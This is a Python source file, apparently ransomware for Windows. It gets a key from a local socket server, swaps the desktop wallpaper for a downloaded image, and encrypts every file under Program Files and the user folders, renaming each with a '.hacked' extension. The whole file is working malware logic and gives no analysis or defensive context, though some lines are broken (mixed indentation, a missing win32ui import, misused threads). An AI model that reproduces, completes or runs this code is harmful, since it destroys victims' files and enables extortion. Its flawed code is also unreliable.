
"""

	Author : 3x1t1um

"""

import sys
import os
import socket
import base64
from cryptography.fernet import Fernet
import ctypes
import win32con
import win32gui
import win32api
import requests
import getpass
import threading


def changewallpaper(path):
	with open(os.getcwd()+'\\lZGyJ0.jpg', 'wb') as f:
		f.write(requests.get('http://image.noelshack.com/fichiers/2020/13/2/1585058003-lzgyj0.jpg').content)
	f.close()
	
	key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,"Control Panel\\Desktop",0,win32con.KEY_SET_VALUE)
	win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "0")
	win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
	win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, path, 1+2)

	os.remove('lZGyJ0.jpg')

def encrypt_file(path, key, data):
	if os.getcwd()+__file__ == path:
		pass
	elif path.endswith(".hacked")==True:
		pass
	else:
		token = key.encrypt(data)
		data2 = base64.b64encode(token)
		return data2

def encrypt(path, key):
	if sys.argv[0] in path:
		pass
	else:
		with open(path, 'rb') as f:
			data = f.read()
		f.close()

		with open(path, 'wb') as f:
			f.write(encrypt_file(path, key, data))
		f.close()
			
		os.rename(path, path+'.hacked')


def encryption(path, key):
	for dossier, sous_dossiers, fichiers in os.walk(path):
		for fichier in fichiers:
			if os.getcwd()+'\\'+__file__ == path:
				pass
			elif fichier.endswith(".hacked") == True:
				pass
			else:
				try:
					encrypt(os.path.join(dossier, fichier), key)
				except:
					pass

def get_key():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
  try:
	sock.connect(('localhost',1550))
	key = sock.recv(10000)
	fern = base64.b64decode(key)
	return fern
	
  except:
	win32ui.MessageBox('Please restart the script','Error')
	sys.exit(1)


if __name__ == '__main__':
	if ctypes.windll.shell32.IsUserAnAdmin() == True:
		try:
			fernet = Fernet(get_key())
			changewallpaper(os.getcwd()+'\\lZGyJ0.jpg')

			thred1 = threading.Thread(target=encryption('C:/Program Files', fernet))
			thred1.start()
			
			thred2 = threading.Thread(target=encryption('C:/Users/', fernet))
			thred2.start()

			thred3 = threading.Thread(target=encryption('C:/Users/'+getpass.getuser(), fernet))
			thred3.start()			

			thred1.join()
			thred2.join()
			thred3.join()
      
		except:
			print('Error')
	else:
		win32ui.MessageBox('Please run the script with administrator permissions','Error')
